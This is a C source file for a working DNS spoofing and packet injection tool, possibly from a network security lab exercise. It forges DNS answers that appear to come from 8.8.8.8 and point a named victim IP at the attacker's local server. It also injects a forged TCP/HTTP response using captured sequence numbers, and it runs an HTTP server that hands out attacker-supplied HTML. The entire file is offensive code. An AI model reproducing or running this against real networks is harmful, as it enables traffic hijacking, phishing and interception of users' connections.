#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdarg.h>
#include <pthread.h>
#include <netinet/udp.h>
#include "common.h"
#include "utils.h"

#define DNS_PORT 53
#define HTTP_PORT 80
#define BUFFER_SIZE 4096

void send_dns_response(struct dns_info *dns);
void send_fake_response(const char *response, const char *victim_ip, struct conn_info *conn);
void handle_victim_request(const char *buffer, struct sockaddr_in *clientaddr, socklen_t len, int sockfd);
void *http_server(void *arg);

void send_fake_response(const char *response, const char *victim_ip, struct conn_info *conn) {
    printf("\n=== Building HTTP Response Packet ===\n");
    printf("Victim IP: %s\n", victim_ip);
    printf("Victim Port: %d\n", conn->sport);
    
    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sd < 0) {
        perror("[-] Socket creation failed");
        return;
    }

    printf("[INFO] Raw socket created\n");

    char packet[4096];
    memset(packet, 0, sizeof(packet));
    struct iphdr *ip = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));

    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(response));
    ip->id = htons(rand());
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_TCP;
    ip->saddr = inet_addr(LOCAL_SERVER_HOST);
    ip->daddr = inet_addr(victim_ip);

    tcp->th_sport = htons(80);
    tcp->th_dport = htons(conn->sport);
    tcp->th_seq = htonl(conn->ack);
    tcp->th_ack = htonl(conn->seq + 1);
    tcp->th_off = 5;
    tcp->th_flags = TH_PUSH | TH_ACK;
    tcp->th_win = htons(conn->window);

    memcpy(packet + sizeof(struct iphdr) + sizeof(struct tcphdr), response, strlen(response));

    printf("[DEBUG] Spoofed response created with SEQ=%u ACK=%u\n", ntohl(tcp->th_seq), ntohl(tcp->th_ack));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = ip->daddr;

    for(int i = 0; i < 3; i++) {
        if (sendto(sd, packet, ntohs(ip->tot_len), 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
            perror("[ERROR] sendto() failed");
        } else {
            printf("[SUCCESS] Spoofed response %d sent to %s:%d\n", i+1, victim_ip, conn->sport);
        }
        usleep(1000);
    }

    close(sd);
}

void handle_victim_request(const char *buffer, struct sockaddr_in *clientaddr, socklen_t len, int sockfd) {
    printf("\n=== STEP 4: Processing Victim Request ===\n");
    printf("=== Raw Buffer Content ===\n%s\n", buffer);
    printf("=== End Buffer Content ===\n");

    if (strstr(buffer, "DNS_REQUEST") != NULL) {
        printf("[+] Found DNS_REQUEST marker\n");
        
        struct dns_info dns = {0};
        int matches = sscanf(buffer, "DNS_REQUEST\nTXID=%hu\nQUERY=%s\nSPORT=%hu\n", &dns.txid, dns.query, &dns.src_port);

        printf("[DNS] Parse results:\n");
        printf("- Matches found: %d (expecting 3)\n", matches);
        printf("- TXID: %u\n", dns.txid);
        printf("- Query: %s\n", dns.query);
        printf("- Sport: %u\n", dns.src_port);

        if (matches == 3) {
            printf("[DNS] Successfully parsed all fields\n");
            printf("[DNS] Calling send_dns_response()...\n");
            
            send_dns_response(&dns);
            printf("[DNS] send_dns_response() completed\n");
            
            const char *ack = "DNS_RESPONSE_SENT";
            if (sendto(sockfd, ack, strlen(ack), 0, (struct sockaddr *)clientaddr, len) < 0) {
                perror("[ERROR] Failed to send DNS ACK");
            } else {
                printf("[DNS] Sent acknowledgment to sniffer\n");
            }
        } else {
            printf("[ERROR] Failed to parse DNS request (got %d fields)\n", matches);
            printf("[ERROR] Buffer content may be malformed\n");
        }
    } else if (strstr(buffer, "VICTIM_HTTP") != NULL) {
        printf("\n=== Processing HTTP Request ===\n");
        struct conn_info conn;
        char data[4096];
        
        int parsed = sscanf(buffer, "VICTIM_HTTP\nSEQ=%u\nACK=%u\nSPORT=%hu\nDPORT=%hu\nWINDOW=%hu\nFLAGS=%hhx\nDATA=%[^\n]", &conn.seq, &conn.ack, &conn.sport, &conn.dport, &conn.window, &conn.flags, data);

        printf("Parsed %d fields from HTTP request\n", parsed);
        printf("Source Port: %d\n", conn.sport);
        printf("Data: %s\n", data);

        char *html = read_html_file();
        if (html) {
            printf("\n=== Sending Fake Response ===\n");
            printf("HTML content length: %lu\n", strlen(html));
            send_fake_response(html, VICTIM_IP, &conn);
        } else {
            printf("Failed to read HTML file\n");
        }

        const char *ack = "HTTP_RESPONSE_SENT";
        sendto(sockfd, ack, strlen(ack), 0, (struct sockaddr *)clientaddr, len);
    } else {
        printf("[ERROR] Unknown request type in buffer\n");
        printf("[ERROR] Buffer starts with: %.20s...\n", buffer);
    }
    fflush(stdout);
}

void send_dns_response(struct dns_info *dns) {
    printf("\n[DNS] Creating DNS response for query: %s\n", dns->query);

    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sd < 0) {
        perror("[DNS] Raw socket failed");
        return;
    }

    int one = 1;
    const int *val = &one;
    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("[DNS] setsockopt failed");
        close(sd);
        return;
    }

    char packet[1024] = {0};
    struct iphdr *ip = (struct iphdr *)packet;
    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
    char *dns_resp = (char *)(udp + 1);

    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    ip->saddr = inet_addr("8.8.8.8");
    ip->daddr = inet_addr(VICTIM_IP);

    udp->uh_sport = htons(53);
    udp->uh_dport = htons(dns->src_port);
    udp->uh_ulen = 0;
    udp->uh_sum = 0;

    struct dns_header *dns_hdr = (struct dns_header *)dns_resp;
    dns_hdr->id = htons(dns->txid);
    dns_hdr->flags = htons(0x8180);
    dns_hdr->qdcount = htons(1);
    dns_hdr->ancount = htons(1);
    dns_hdr->nscount = 0;
    dns_hdr->arcount = 0;

    char *ptr = dns_resp + sizeof(struct dns_header);
    int query_len = strlen(dns->query);
    memcpy(ptr, dns->query, query_len + 1);
    ptr += query_len + 1;

    ptr[0] = 0xc0; ptr[1] = 0x0c;
    ptr[2] = 0x00; ptr[3] = 0x01;
    ptr[4] = 0x00; ptr[5] = 0x01;
    ptr[6] = 0x00; ptr[7] = 0x00;
    ptr[8] = 0x00; ptr[9] = 0x3c;
    ptr[10] = 0x00; ptr[11] = 0x04;
    
    uint32_t redirect_ip = inet_addr(LOCAL_SERVER_HOST);
    memcpy(ptr + 12, &redirect_ip, 4);

    int dns_size = sizeof(struct dns_header) + query_len + 1 + 16;
    int udp_len = sizeof(struct udphdr) + dns_size;
    int total_len = sizeof(struct iphdr) + udp_len;

    ip->tot_len = htons(total_len);
    udp->uh_ulen = htons(udp_len);

    ip->check = calculate_checksum((unsigned short *)ip, sizeof(struct iphdr));
    
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = ip->daddr;
    
    printf("[DNS] Sending response to %s:%d\n", VICTIM_IP, dns->src_port);
    printf("[DNS] Response size: %d bytes\n", total_len);
    printf("[DNS] Redirecting to: %s\n", LOCAL_SERVER_HOST);

    for(int i = 0; i < 3; i++) {
        if (sendto(sd, packet, total_len, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
            perror("[DNS] sendto failed");
        } else {
            printf("[DNS] Response packet %d sent successfully\n", i+1);
        }
        usleep(1000);
    }

    close(sd);
}

void *http_server(void *arg) {
    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    char buffer[BUFFER_SIZE] = {0};

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("Socket failed");
        exit(EXIT_FAILURE);
    }

    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(HTTP_PORT);

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("Bind failed");
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 3) < 0) {
        perror("Listen");
        exit(EXIT_FAILURE);
    }

    while (1) {
        if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t *)&addrlen)) < 0) {
            perror("Accept");
            exit(EXIT_FAILURE);
        }

        read(new_socket, buffer, BUFFER_SIZE);
        printf("Received HTTP request:\n%s\n", buffer);

        char *html_content = read_html_file();
        if (html_content == NULL) {
            debug_log("Failed to read HTML content");
            close(new_socket);
            continue;
        }

        char response[BUFFER_SIZE];
        snprintf(response, sizeof(response),
                 "HTTP/1.1 200 OK\r\n"
                 "Content-Type: text/html\r\n"
                 "Content-Length: %lu\r\n"
                 "Connection: close\r\n"
                 "\r\n%s",
                 strlen(html_content), html_content);

        send(new_socket, response, strlen(response), 0);
        printf("Sent HTTP response\n");

        close(new_socket);
    }

    return NULL;
}

int main(int argc, char **argv) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <interface> <spoof_ip>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    char *interface = argv[1];
    char *spoof_ip = argv[2];

    int sock;
    struct sockaddr_in client_addr;
    socklen_t addr_len = sizeof(client_addr);
    unsigned char buffer[BUFFER_SIZE];

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(DNS_PORT);

    if (bind(sock, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind failed");
        close(sock);
        exit(EXIT_FAILURE);
    }

    pthread_t http_thread;
    if (pthread_create(&http_thread, NULL, http_server, NULL) != 0) {
        perror("Failed to create HTTP server thread");
        close(sock);
        exit(EXIT_FAILURE);
    }

    printf("DNS spoofing server is running...\n");

    while (1) {
        int n = recvfrom(sock, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&client_addr, &addr_len);
        if (n < 0) {
            perror("recvfrom");
            continue;
        }

        printf("Received DNS query from %s\n", inet_ntoa(client_addr.sin_addr));

        char query_name[256];
        int query_name_len = buffer[12];
        memcpy(query_name, buffer + 13, query_name_len);
        query_name[query_name_len] = '\0';

        struct dns_info dns;
        dns.txid = (buffer[0] << 8) | buffer[1];
        strcpy(dns.query, query_name);
        dns.src_port = ntohs(client_addr.sin_port);

        send_dns_response(&dns);
    }

    close(sock);
    return 0;
}
``` 